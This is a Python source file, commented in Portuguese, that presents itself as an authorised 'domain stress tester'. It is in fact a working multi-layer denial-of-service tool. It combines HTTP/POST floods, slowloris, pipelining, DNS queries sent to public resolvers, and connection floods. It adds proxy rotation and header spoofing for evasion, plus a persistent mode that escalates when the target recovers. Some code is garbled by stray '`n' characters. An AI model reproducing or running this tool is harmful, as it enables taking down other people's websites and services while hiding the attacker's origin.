#!/usr/bin/env python3
# ================================================================
# DOMAIN STRESS TESTER v2.0 - MODO SINGULARITY
# MÚLTIPLAS CAMADAS DE ATAQUE PARA TESTE DE RESILIÊNCIA
# APENAS PARA TESTES AUTORIZADOS
# ================================================================

import concurrent.futures
import random
import socket
import ssl
import threading
import time
import hashlib
import struct
import ipaddress
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Callable
from urllib.parse import urlparse, quote

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from scapy.all import IP, ICMP, sr1  # type: ignore
except ImportError:
    IP, ICMP, sr1 = None, None, None

from utils.logger import get_module_logger

logger = get_module_logger("stress_tester_advanced")

# ================================================================
# CONFIGURAÇÕES AVANÇADAS
# ================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/115.0 Firefox/115.0",
]

# Lista de proxies públicos (para rotação)
PROXY_LIST = [
    # HTTP Proxies
    "http://47.91.84.174:8080",
    "http://103.152.112.120:80",
    "http://103.236.201.58:8080",
    "http://103.70.153.135:8080",
    "http://103.121.90.130:8080",
    # SOCKS5 Proxies
    "socks5://154.16.140.58:1080",
    "socks5://47.91.84.174:1080",
]

# Servidores para amplificação DNS
DNS_AMPLIFICATION_SERVERS = [
    "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26",
    "185.164.68.7", "94.130.97.135", "194.145.225.194", "85.239.53.18",
]

# Padrões de ataque
PAYLOADS = [
    b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n",
    b"POST /login HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 999999\r\n\r\n",
    b"HEAD / HTTP/1.1\r\nHost: {}\r\n\r\n",
    b"OPTIONS / HTTP/1.1\r\nHost: {}\r\n\r\n",
    b"TRACE / HTTP/1.1\r\nHost: {}\r\n\r\n",
]


# ================================================================
# STATS COLLECTOR MELHORADO
# ================================================================

class AdvancedStatsCollector:
    """Coletor de estatísticas avançado"""

    def __init__(self):
        self.lock = threading.Lock()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.end_time = None
        self.rps_history = []
        self.errors = []
        self.by_method = {}
        self.target_status_history = []

    def start(self):
        self.start_time = time.time()

    def stop(self):
        self.end_time = time.time()

    def add_request(self, success: bool, method: str = "http", error: Optional[str] = None):
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
                if error:
                    self.errors.append(error)

            if method not in self.by_method:
                self.by_method[method] = {"success": 0, "fail": 0}
            if success:
                self.by_method[method]["success"] += 1
            else:
                self.by_method[method]["fail"] += 1

    def add_target_status(self, is_up: bool):
        with self.lock:
            self.target_status_history.append({"timestamp": time.time(), "is_up": is_up})

    def get_rps(self) -> float:
        if self.start_time is None:
            return 0.0
        elapsed = time.time() - self.start_time
        if elapsed == 0:
            return 0.0
        return self.total_requests / elapsed

    def get_success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful_requests / self.total_requests) * 100

    def get_duration(self) -> float:
        if self.start_time is None:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    def get_summary(self) -> Dict:
        return {
            "total_requests": self.total_requests,
            "successful": self.successful_requests,
            "failed": self.failed_requests,
            "success_rate": round(self.get_success_rate(), 2),
            "avg_rps": round(self.get_rps(), 2),
            "duration": round(self.get_duration(), 2),
            "errors": self.errors[:10],
            "by_method": self.by_method,
            "uptime_history": self.target_status_history[-10:],
        }

    def get_current_uptime(self, window: int = 10) -> float:
        """Calcula a porcentagem de uptime nos últimos segundos"""
        if not self.target_status_history:
            return 100.0
        now = time.time()
        recent = [s for s in self.target_status_history if now - s["timestamp"] <= window]
        if not recent:
            return 100.0
        up_count = sum(1 for s in recent if s["is_up"])
        return (up_count / len(recent)) * 100


# ================================================================
# ENGINES AVANÇADAS
# ================================================================

class AdvancedStressEngine:
    """Engine base avançada"""

    def __init__(self, target: str, threads: int, duration: int, proxies: List[str] = None):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = AdvancedStatsCollector()
        self.proxies = proxies or []
        self.session = self._create_session()
        self.proxy_index = 0

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _random_headers(self) -> Dict:
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive", "close"]),
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }

    def _get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return self.proxies[self.proxy_index]

    def _generate_payload(self, size: int = 1024) -> bytes:
        return b"".join(random.choices(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=size))

    def _check_target_up(self, timeout: int = 3) -> bool:
        """Verifica se o alvo está ativo"""
        try:
            url = f"http://{self.target}/" if not self.target.startswith("http") else self.target
            response = self.session.get(url, timeout=timeout)
            return response.status_code < 500
        except Exception:
            return False

    def run(self) -> AdvancedStatsCollector:
        self.stats.start()
        self.running = True

        # Verifica status inicial
        initial_up = self._check_target_up()
        self.stats.add_target_status(initial_up)
        logger.info(f"[*] Status inicial: {'UP' if initial_up else 'DOWN'}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._worker, i) for i in range(self.threads)]

            # Thread para verificar status periodicamente
            monitor_future = executor.submit(self._monitor_target)

            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                time.sleep(0.5)
                self.running = self.duration > (time.time() - start_time)

            self.running = False
            self.stats.stop()

            # Aguarda workers
            concurrent.futures.wait(futures, timeout=10)
            monitor_future.cancel()

        return self.stats

    def _monitor_target(self):
        """Monitora o status do alvo"""
        while self.running:
            is_up = self._check_target_up()
            self.stats.add_target_status(is_up)
            time.sleep(2)

    def _worker(self, worker_id: int):
        raise NotImplementedError


class MultiLayerStressEngine(AdvancedStressEngine):
    """Engine com múltiplas camadas de ataque"""

    def __init__(self, target: str, threads: int, duration: int, proxies: List[str] = None):
        super().__init__(target, threads, duration, proxies)
        self.attack_modes = [
            self._http_flood,
            self._https_flood,
            self._slowloris_attack,
            self._post_flood,
            self._dns_amplification,
            self._tcp_syn_flood,
            self._http_pipeline,
            self._http2_flood,
        ]
        self.parsed_target = urlparse(target if target.startswith("http") else f"http://{target}")
        self.base_url = f"{self.parsed_target.scheme or 'http'}://{self.parsed_target.netloc}"
        self.host = self.parsed_target.netloc.split(":")[0]
        self.port = int(self.parsed_target.port) if self.parsed_target.port else (443 if self.parsed_target.scheme == "https" else 80)

    def _worker(self, worker_id: int):
        while self.running:
            try:
                mode = random.choice(self.attack_modes)
                mode()
            except Exception as e:
                self.stats.add_request(False, "unknown", str(e)[:30])

    def _http_flood(self):
        """Flood HTTP básico"""
        try:
            path = random.choice(["/", "/index.html", "/login", "/api/v1/health", "/static/index.js", "/images/logo.png"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers()

            # Adiciona headers para parecer legítimo
            headers["Referer"] = f"{self.base_url}/"
            headers["Origin"] = self.base_url

            proxy = self._get_proxy()`n            proxies = {"http": proxy, "https": proxy} if proxy else None`n`n            response = self.session.get(url, headers=headers, timeout=3, proxies=proxies)
            self.stats.add_request(response.status_code < 500, "http")
        except requests.exceptions.Timeout:
            self.stats.add_request(False, "http", "Timeout")
        except requests.exceptions.ConnectionError:
            self.stats.add_request(False, "http", "ConnectionError")
        except Exception as e:
            self.stats.add_request(False, "http", str(e)[:30])

    def _https_flood(self):
        """Flood HTTPS com TLS renegociação"""
        try:
            if self.parsed_target.scheme == "https" or self.port == 443:
                context = ssl.create_default_context()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.host, 443))
                ssl_sock = context.wrap_socket(sock, server_hostname=self.host)

                request = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
                ssl_sock.send(request.encode())
                ssl_sock.recv(1024)
                ssl_sock.close()
                self.stats.add_request(True, "https")
            else:
                self._http_flood()
        except Exception as e:
            self.stats.add_request(False, "https", str(e)[:30])

    def _slowloris_attack(self):
        """Slowloris - mantém conexões abertas"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))

            headers = [
                f"GET /{random.randint(1, 10000)} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {random.choice(USER_AGENTS)}",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language: en-US,en;q=0.9",
                "Cache-Control: no-cache",
            ]

            for header in headers:
                sock.send(header.encode() + b"\r\n")
                time.sleep(random.uniform(0.1, 0.5))

            # Mantém aberto
            for _ in range(10):
                if not self.running:
                    break
                sock.send(b"X-Client: keep-alive\r\n")
                time.sleep(5)

            sock.close()
            self.stats.add_request(True, "slowloris")
        except Exception as e:
            self.stats.add_request(False, "slowloris", str(e)[:30])

    def _post_flood(self):
        """Flood de POST com dados grandes"""
        try:
            path = random.choice(["/login", "/api/v1/auth", "/submit", "/upload", "/form"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            data = {
                "username": "admin" + str(random.randint(1, 999999)),
                "password": "pass" + str(random.randint(1, 999999)),
                "csrf_token": hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest(),
                "data": self._generate_payload(1024).decode(),
            }

            proxy = self._get_proxy()`n            proxies = {"http": proxy, "https": proxy} if proxy else None`n`n            response = self.session.post(url, data=data, headers=headers, timeout=3, proxies=proxies)
            self.stats.add_request(response.status_code < 500, "post")
        except Exception as e:
            self.stats.add_request(False, "post", str(e)[:30])

    def _dns_amplification(self):
        """Ataque de amplificação DNS"""
        try:
            server = random.choice(DNS_AMPLIFICATION_SERVERS)
            domain = f"{random.randint(1, 999999)}.{self.target}"

            # Constrói query DNS
            query = self._build_dns_query(domain)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(query, (server, 53))
            sock.close()
            self.stats.add_request(True, "dns")
        except Exception as e:
            self.stats.add_request(False, "dns", str(e)[:30])

    def _build_dns_query(self, domain: str) -> bytes:
        """Constrói query DNS amplificada"""
        header = bytearray(12)
        header[0:2] = b'\xAA\xAA'
        header[2:4] = b'\x01\x00'
        header[4:6] = b'\x00\x01'

        qname = b""
        for part in domain.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"
        qtype = b"\x00\x10"  # TXT query para maior resposta
        qclass = b"\x00\x01"

        return bytes(header) + qname + qtype + qclass

    def _tcp_syn_flood(self):
        """Flood TCP SYN (3-way handshake incompleto)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.host, self.port))
            sock.send(b"")  # SYN já enviado no connect
            sock.close()
            self.stats.add_request(True, "syn")
        except Exception as e:
            self.stats.add_request(False, "syn", str(e)[:30])

    def _http_pipeline(self):
        """HTTP Pipelining - múltiplas requisições por conexão"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.host, self.port))

            req_template = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nConnection: keep-alive\r\n\r\n"
            requests_batch = req_template * 10

            sock.send(requests_batch.encode())
            # Tenta ler resposta
            for _ in range(3):
                sock.recv(1024)
            sock.close()
            self.stats.add_request(True, "pipeline")
        except Exception as e:
            self.stats.add_request(False, "pipeline", str(e)[:30])

    def _http2_flood(self):
        """Flood HTTP/2 (simulado)"""
        # HTTP/2 real exigiria biblioteca h2
        # Simulamos com requisições normais
        for _ in range(5):
            self._http_flood()
            time.sleep(0.01)


class PersistentStressEngine(MultiLayerStressEngine):
    """Engine que persiste até o alvo cair e verifica quando voltar"""

    def __init__(self, target: str, threads: int, duration: int, proxies: List[str] = None):
        super().__init__(target, threads, duration, proxies)
        self.target_down = False
        self.down_time = None
        self.backup_interval = 10

    def run(self) -> AdvancedStatsCollector:
        self.stats.start()
        self.running = True

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Workers de ataque
            workers = [executor.submit(self._worker, i) for i in range(self.threads)]

            # Thread de monitoramento
            monitor = executor.submit(self._monitor_and_persist)

            start_time = time.time()
            while self.running:
                time.sleep(1)
                elapsed = time.time() - start_time

                # Verifica se o alvo está realmente morto
                if self.target_down and self.stats.get_current_uptime() < 10:
                    logger.info(f"[!] Alvo derrubado há {self.down_time}s")
                    self.duration = max(self.duration, elapsed + 60)  # Estende duração

                if elapsed > self.duration and self.target_down:
                    break
                elif elapsed > self.duration * 2:  # Limite máximo
                    break

            self.running = False
            self.stats.stop()

            concurrent.futures.wait(workers, timeout=10)
            monitor.cancel()

        return self.stats

    def _monitor_and_persist(self):
        """Monitora e mantém ataque se o alvo tentar voltar"""
        down_count = 0
        while self.running:
            is_up = self._check_target_up()
            self.stats.add_target_status(is_up)

            if not is_up:
                down_count += 1
                if not self.target_down:
                    self.target_down = True
                    self.down_time = time.time()
                    logger.info("[!] Alvo derrubado!")
            else:
                down_count = 0
                if self.target_down:
                    self.target_down = False
                    logger.info("[!] Alvo voltou! Reativando ataque...")
                    # Aumenta threads temporariamente
                    self.threads = min(self.threads + 50, 500)

            if down_count > 5:
                self.threads = max(self.threads - 10, 10)  # Reduz se já está morto

            time.sleep(2)


# ================================================================
# FACTORY MELHORADO
# ================================================================

def create_engine(method: str, target: str, threads: int, duration: int,
                  proxies: List[str] = None, persistent: bool = False) -> AdvancedStressEngine:
    """Cria engine apropriada"""
    if persistent:
        return PersistentStressEngine(target, threads, duration, proxies)
    return MultiLayerStressEngine(target, threads, duration, proxies)


# ================================================================
# FUNÇÃO PRINCIPAL
# ================================================================

def run_stress(target: str, method: str = "multilayer", threads: int = 100,
               duration: int = 30, proxies: List[str] = None, persistent: bool = False) -> Dict:
    """Executa o teste de stress com múltiplas camadas"""

    logger.info(f"[*] Iniciando ataque em {target}")
    logger.info(f"[*] Modo: {'Persistente' if persistent else 'Multi-camadas'}")
    logger.info(f"[*] Threads: {threads} | Duração: {duration}s")

    engine = create_engine(method, target, threads, duration, proxies, persistent)
    stats = engine.run()

    report = generate_advanced_report(target, threads, stats, persistent)
    summary = stats.get_summary()

    # Verifica se o alvo foi derrubado
    uptime = stats.get_current_uptime()
    is_down = uptime < 20

    return {
        "target": target,
        "threads": threads,
        "duration": duration,
        "persistent": persistent,
        "is_down": is_down,
        "uptime": uptime,
        "stats": summary,
        "report": report,
    }


def generate_advanced_report(target: str, threads: int, stats: AdvancedStatsCollector, persistent: bool) -> str:
    summary = stats.get_summary()
    uptime = stats.get_current_uptime()

    lines = []
    lines.append("═══" * 25)
    lines.append("  DOMAIN STRESS TEST REPORT v2.0 - SINGULARITY")
    lines.append("═══" * 25)
    lines.append(f"  Target: {target}")
    lines.append(f"  Threads: {threads}")
    lines.append(f"  Persistent: {'YES' if persistent else 'NO'}")
    lines.append(f"  Duration: {summary['duration']:.1f}s")
    lines.append(f"  Current Uptime: {uptime:.1f}%")
    lines.append(f"  Status: {'🔴 DOWN' if uptime < 20 else '🟢 UP'}")
    lines.append("═══" * 25)
    lines.append("")
    lines.append("▸ STATISTICS")
    lines.append(f"  Total Requests: {summary['total_requests']:,}")
    lines.append(f"  Successful: {summary['successful']:,} ({summary['success_rate']:.1f}%)")
    lines.append(f"  Failed: {summary['failed']:,} ({100 - summary['success_rate']:.1f}%)")
    lines.append(f"  Avg RPS: {summary['avg_rps']:.2f}")
    lines.append("")

    if summary.get("by_method"):
        lines.append("▸ BY ATTACK METHOD")
        for method, data in summary["by_method"].items():
            total = data["success"] + data["fail"]
            if total > 0:
                success_pct = (data["success"] / total) * 100
                lines.append(f"  {method.upper()}: {total:,} reqs ({success_pct:.1f}% success)")
        lines.append("")

    if stats.errors:
        lines.append("▸ ERRORS (last 10)")
        for error in stats.errors[:10]:
            lines.append(f"  - {error}")
        lines.append("")

    if stats.target_status_history:
        lines.append("▸ TARGET STATUS HISTORY")
        total_checks = len(stats.target_status_history)
        down_checks = sum(1 for s in stats.target_status_history if not s["is_up"])
        lines.append(f"  Total checks: {total_checks}")
        lines.append(f"  Down checks: {down_checks} ({down_checks/total_checks*100:.1f}%)")
        lines.append("")

    lines.append("═══" * 25)
    lines.append("  TEST COMPLETED")
    lines.append("═══" * 25)

    return "\n".join(lines)


def run(config: Dict = None) -> Dict:
    if config is None:
        config = {}

    target = config.get("target", "")
    if not target:
        raise ValueError("Target is required")

    method = config.get("method", "multilayer")
    threads = config.get("threads", 100)
    duration = config.get("duration", 30)
    proxies = config.get("proxies", PROXY_LIST[:5])
    persistent = config.get("persistent", False)

    return run_stress(target, method, threads, duration, proxies, persistent)


# ================================================================
# CLI
# ================================================================

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Advanced Domain Stress Tester v2.0")
    parser.add_argument("--target", required=True, help="Target domain or IP")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("--method", default="multilayer", help="Attack method: multilayer, http, https, slowloris, dns, tcp")
    parser.add_argument("--persistent", action="store_true", help="Persistent mode - keep attacking until down")
    parser.add_argument("--proxies", help="Comma-separated list of proxies")

    args = parser.parse_args()

    proxies = args.proxies.split(",") if args.proxies else None

    result = run_stress(
        target=args.target,
        method=args.method,
        threads=args.threads,
        duration=args.duration,
        proxies=proxies,
        persistent=args.persistent
    )

    print("\n" + result["report"])
    print(f"\n[+] Target is {'DOWN' if result['is_down'] else 'UP'} (uptime: {result['uptime']:.1f}%)")

